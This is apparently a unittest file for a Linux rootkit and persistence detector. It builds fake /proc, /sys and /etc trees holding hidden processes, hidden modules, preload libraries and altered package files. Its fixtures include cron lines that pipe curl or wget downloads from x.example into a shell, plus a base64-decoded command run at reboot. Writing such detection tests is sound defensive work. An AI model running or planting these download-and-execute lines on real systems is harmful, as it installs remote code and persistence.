"""Linux system check on a fake /proc, /sys and /etc: findings, and no false alarms."""
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from backends import linux_system_check as check


class SystemCheckTests(unittest.TestCase):
    def setUp(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        self.root = Path(directory.name)
        self.proc, self.sys, self.etc = self.root / 'proc', self.root / 'sys', self.root / 'etc'
        self.home, self.config = self.root / 'home', self.root / 'home/.config'
        for folder in (self.proc, self.sys / 'module', self.etc, self.config):
            folder.mkdir(parents=True)

    def write(self, path, text):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        return path

    def process(self, pid, exe=None, name='prog', group=None, command=None):
        folder = self.proc / str(pid)
        folder.mkdir()
        if exe is not None:
            os.symlink(exe, folder / 'exe')
        self.write(folder / 'comm', name + '\n')
        self.write(folder / 'status', f'Name:\t{name}\nTgid:\t{group or pid}\nPid:\t{pid}\n')
        (folder / 'cmdline').write_bytes((command or name).encode() + b'\0--flag\0')

    def checks(self, findings):
        return [entry['check'] for entry in findings]

    def test_extra_library_for_every_program_is_found(self):
        self.assertEqual(check.preload_file(self.etc), [])
        self.write(self.etc / 'ld.so.preload', '# nothing\n\n')
        self.assertEqual(check.preload_file(self.etc), [])
        self.write(self.etc / 'ld.so.preload', '/usr/lib/libhide.so\n')
        findings = check.preload_file(self.etc)
        self.assertEqual(self.checks(findings), ['preload'])
        self.assertIn('/usr/lib/libhide.so', findings[0]['detail'])

    def test_extra_library_in_startup_files_is_found_but_not_in_comments(self):
        self.write(self.home / '.bashrc', '# export LD_PRELOAD=/old.so\nalias ll="ls -l"\n')
        self.write(self.config / 'systemd/user/x.service.d/override.conf', '[Service]\nEnvironment=PATH=/usr/bin\n')
        self.assertEqual(check.preload_in_startup_files(self.home, self.config, self.etc), [])
        self.write(self.home / '.profile', 'export LD_PRELOAD=/home/u/.cache/.l.so\n')
        self.write(self.config / 'systemd/user/x.service.d/override.conf', '[Service]\nEnvironment=LD_PRELOAD=/x.so\n')
        findings = check.preload_in_startup_files(self.home, self.config, self.etc)
        self.assertEqual(len(findings), 2)
        self.assertIn('.l.so', findings[0]['detail'] + findings[1]['detail'])

    def test_programs_from_temporary_folders_or_memory_are_found(self):
        self.process(100, '/usr/bin/firefox (deleted)', 'firefox')  # still running after an update
        self.process(101, '/tmp/.mount_EtcherX/etcher', 'etcher')  # an AppImage
        self.process(102, '/memfd:runc_cloned:/proc/self/exe (deleted)', 'runc')
        self.process(103, '/dev/shm/.x/kworker', 'kworker')
        self.process(104, '/memfd:payload (deleted)', '3', command='/proc/self/fd/3')
        self.process(105)  # a kernel thread or another user's process: no readable exe
        findings = check.suspicious_processes(self.proc)
        self.assertEqual(self.checks(findings), ['temporary-process', 'memory-process'])
        self.assertIn('kworker (process 103) runs /dev/shm/.x/kworker', findings[0]['detail'])
        self.assertIn('3 (process 104)', findings[1]['detail'])

    def test_hidden_process_is_found_but_threads_are_not(self):
        self.write(self.proc / 'sys/kernel/ns_last_pid', '60\n')
        self.process(1, name='systemd')
        self.process(40, name='bash')
        self.process(41, name='bash', group=40)  # a thread: exists, but not listed
        self.process(50, name='diamorphine')
        listed = lambda _proc: {1, 40}  # a rootkit hides 50 from the listing
        findings = check.hidden_processes(self.proc, listed)
        self.assertEqual(self.checks(findings), ['hidden-process'])
        self.assertIn('Process 50 (diamorphine)', findings[0]['detail'])
        self.assertEqual(check.hidden_processes(self.proc, lambda _proc: {1, 40, 50}), [])

    def test_hidden_kernel_module_is_found_but_built_in_parts_are_not(self):
        self.write(self.proc / 'modules', 'nvidia 54001664 0 - Live 0x0\n')
        self.write(self.sys / 'module/nvidia/initstate', 'live\n')
        (self.sys / 'module/printk').mkdir()  # built into the kernel: no initstate
        self.assertEqual(check.hidden_modules(self.proc, self.sys), [])
        self.write(self.sys / 'module/reptile/initstate', 'live\n')
        findings = check.hidden_modules(self.proc, self.sys)
        self.assertEqual(self.checks(findings), ['hidden-module'])
        self.assertIn('reptile', findings[0]['detail'])

    def test_startup_entries_that_download_decode_or_run_from_temporary_folders(self):
        commands = [
            ('autostart', '/usr/bin/nextcloud --background'),
            ('autostart', 'sh -c "sleep 5 && /usr/bin/syncthing"'),
            ('cron', '*/5 * * * * curl -fsSL http://x.example/i.sh | bash'),
            ('cron', '@reboot echo ZWNobyBoaQ== | base64 -d | sh'),
            ('systemd', '/tmp/.ICE-unix/.x/update'),
            ('autostart', '/tmp/.mount_Obsidian/obsidian'),
        ]
        findings = check.suspicious_startup_commands(commands)
        self.assertEqual([entry['title'].split()[-1] for entry in findings], ['script', 'commands', 'folder'])

    def test_crontab_lines_are_read_without_comments(self):
        crontab = self.write(self.root / 'bin/crontab', '#!/bin/sh\nprintf "# m h\\nMAILTO=x\\n@reboot /tmp/a\\n"\n')
        crontab.chmod(0o755)
        self.write(self.etc / 'cron.d/backup', '# nightly\n0 3 * * * root /usr/bin/backup\n')
        commands = check.crontab_commands(self.etc, crontab=str(crontab))
        self.assertIn(('your crontab', '@reboot /tmp/a'), commands)
        self.assertIn((str(self.etc / 'cron.d/backup'), '0 3 * * * root /usr/bin/backup'), commands)
        self.assertNotIn('# m h', [command for _source, command in commands])

    def test_all_checks_report_what_ran_and_skip_what_is_unavailable(self):
        self.write(self.proc / 'modules', '')
        findings, ran = check.run_checks(home=self.home, config=self.config, startup_commands=[],
                                         proc=self.proc, sys=self.root / 'missing', etc=self.etc)
        self.assertEqual(findings, [])
        self.assertIn('Hidden programs', ran)


    # ── deeper checks with administrator rights ─────────────────────

    def manager_script(self, output):
        """A fake package manager that prints `output` whatever it is asked."""
        script = self.write(self.root / 'bin/manager', f"#!/bin/sh\ncat <<'END'\n{output}\nEND\n")
        script.chmod(0o755)
        return str(script)

    def test_changed_system_programs_are_found_but_not_configuration(self):
        rpm = ('S.5....T.  c /etc/ssh/sshd_config\n..5......    /usr/bin/ps\nmissing     /usr/lib/gone.so\n'
               '.M.......    /usr/bin/su\n..5......    /usr/share/doc/readme')
        self.assertEqual(check.changed_package_files('rpm', rpm), ['/usr/bin/ps'])
        dpkg = '??5??????   /usr/bin/ls\n??5?????? c /etc/default/grub\nmissing     /var/lib/apt/lists/partial'
        self.assertEqual(check.changed_package_files('dpkg', dpkg), ['/usr/bin/ls'])
        pacman = ('warning: procps-ng: /usr/bin/ps (SHA256 checksum mismatch)\n'
                  'warning: pacman: /etc/pacman.conf (Modification time mismatch)\n'
                  'procps-ng: 98 total files, 0 altered files')
        self.assertEqual(check.changed_package_files('pacman', pacman), ['/usr/bin/ps'])

    def test_files_of_no_package_are_found_also_under_the_merged_usr_name(self):
        rpm = self.manager_script('file /usr/local/bin/suidshell is not owned by any package\nshadow-utils-4.15')
        self.assertEqual(check.unowned_files('rpm', rpm, ['/usr/local/bin/suidshell', '/usr/bin/passwd']),
                         ['/usr/local/bin/suidshell'])
        # Debian's database knows /bin/mount, not /usr/bin/mount.
        dpkg = self.manager_script('dpkg-query: no path found matching pattern /usr/bin/mount\n'
                                   'mount: /bin/mount\n'
                                   'dpkg-query: no path found matching pattern /usr/bin/evil\n'
                                   'dpkg-query: no path found matching pattern /bin/evil')
        self.assertEqual(check.unowned_files('dpkg', dpkg, ['/usr/bin/mount', '/usr/bin/evil']), ['/usr/bin/evil'])
        self.assertEqual(check.merged_aliases('/lib/systemd/system/x.service'), ['/usr/lib/systemd/system/x.service'])

    def test_only_local_folders_are_searched_for_special_rights(self):
        data = self.root / 'data with space'
        data.mkdir()
        escaped = str(data).replace(' ', '\\040')  # /proc/self/mounts writes a space as \040
        mounts = self.write(self.root / 'mounts', '\n'.join([
            f'/dev/sda1 {self.root} ext4 rw 0 0', f'/dev/sda2 {escaped} btrfs rw 0 0',
            'proc /proc proc rw 0 0', 'server:/x /mnt/nfs nfs4 rw 0 0', f'/dev/sda1 {self.root / "mounts"} ext4 rw 0 0',
            '/dev/loop0 /snap/core/1 squashfs ro 0 0']))
        self.assertEqual(check.local_mounts(mounts), [str(self.root), str(data)])

    def test_system_services_running_unusual_or_unpackaged_programs(self):
        units, packaged = self.root / 'etc/systemd/system', self.root / 'usr/lib/systemd/system'
        tool = self.write(self.root / 'opt/tool/run', '')
        self.write(units / 'backup.service', '[Service]\nExecStart=/usr/bin/rsync -a /home /backup\n')
        self.write(units / 'update.service', '[Service]\nExecStart=-/home/u/.cache/.update --quiet\n')
        self.write(units / 'tool.service', f'[Service]\nExecStart={tool}\n')
        os.symlink(packaged / 'sshd.service', units / 'sshd.service')  # enabled link: not read
        self.write(packaged / 'sshd.service', '[Service]\nExecStart=/usr/sbin/sshd -D\n')
        self.write(packaged / 'kworkerd.service', '[Service]\nExecStart=/usr/sbin/sshd\n')
        manager = self.manager_script(f'file {packaged / "kworkerd.service"} is not owned by any package\n'
                                      f'file {tool} is not owned by any package')
        # The test folder itself is in /tmp, which would count as a temporary folder.
        with patch.object(check, 'TEMPORARY', ('/dev/shm/',)):
            findings = check.system_service_findings('rpm', manager, [units], [packaged])
        details = ' '.join(entry['detail'] for entry in findings)
        self.assertEqual(sorted(entry['check'] for entry in findings),
                         ['service-program', 'service-program', 'unowned-service'])
        self.assertIn('kworkerd.service is in the folder of installed packages', details)
        self.assertIn('/home/u/.cache/.update', details)
        self.assertIn(f'runs {tool}, which belongs to no installed package', details)
        self.assertNotIn('rsync', details)

    def test_scheduled_tasks_of_all_users_are_read(self):
        spool = self.root / 'spool'
        self.write(spool / 'root', '* * * * * wget -q -O- http://x.example/m | sh\n')
        self.write(self.etc / 'cron.daily/logrotate', '#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n')
        commands = check.all_crontab_commands([spool], self.etc)
        findings = check.suspicious_startup_commands(commands)
        self.assertEqual([entry['where'] for entry in findings], ['crontab of root'])

    def test_root_checks_without_a_package_manager_still_check_processes(self):
        self.write(self.proc / 'modules', '')
        findings, ran = check.run_root_checks(None, {}, proc=self.proc, sys=self.sys, etc=self.etc,
                                              spool=[self.root / 'none'])
        self.assertEqual(findings, [])
        self.assertIn('Hidden programs of all users', ran)
        self.assertNotIn('System programs and libraries compared with their packages', ran)


    def test_deeper_check_runs_the_module_source_with_a_trusted_isolated_python(self):
        from backends.linux import LinuxBackend
        from core.authorization import AuthorizationError
        backend = LinuxBackend()
        calls = self.root / 'calls'
        pkexec = self.write(self.root / 'bin/pkexec',
                            f'#!/bin/sh\necho "$@" > {calls}\n[ "$1" = --disable-internal-agent ] && shift\nexec "$@"\n')
        pkexec.chmod(0o755)
        with patch.object(LinuxBackend, '_require_authorizer', return_value=str(pkexec)), \
                patch.object(LinuxBackend, 'distro_info', return_value={'pkg_manager': 'apk'}):
            findings, ran = backend.deep_system_check()
        self.assertIsInstance(findings, list)
        self.assertIn('Hidden programs of all users', ran)
        arguments = calls.read_text()
        self.assertRegex(arguments, r'^--disable-internal-agent /\S*python3\S* -I -c ')
        self.assertIn('"manager": null', arguments)  # apk: no package database check
        cancelled = self.write(self.root / 'bin/cancelled', '#!/bin/sh\nexit 126\n')
        cancelled.chmod(0o755)
        with patch.object(LinuxBackend, '_require_authorizer', return_value=str(cancelled)), \
                self.assertRaises(AuthorizationError):
            backend.deep_system_check()

    def test_deeper_result_includes_the_users_own_checks_once(self):
        from core import system_check
        own = {'check': 'preload-startup', 'title': 'A', 'detail': 'd', 'where': '/home/u/.profile'}
        shared = {'check': 'temporary-process', 'title': 'B', 'detail': 'd', 'where': '/tmp/x'}
        root = {'check': 'changed-program', 'title': 'C', 'detail': 'd', 'where': '/usr/bin/ps'}
        with patch.object(system_check.backend, 'system_check', return_value=([own, shared], ['Mine'])), \
                patch.object(system_check.backend, 'deep_system_check', return_value=([root, shared], ['Root'])):
            result = system_check.run_deep_system_check()
        self.assertEqual([entry['title'] for entry in result['findings']], ['C', 'B', 'A'])
        self.assertEqual(result['checks'], ['Root', 'Mine'])
        self.assertTrue(result['deep'])


if __name__ == '__main__':
    unittest.main()
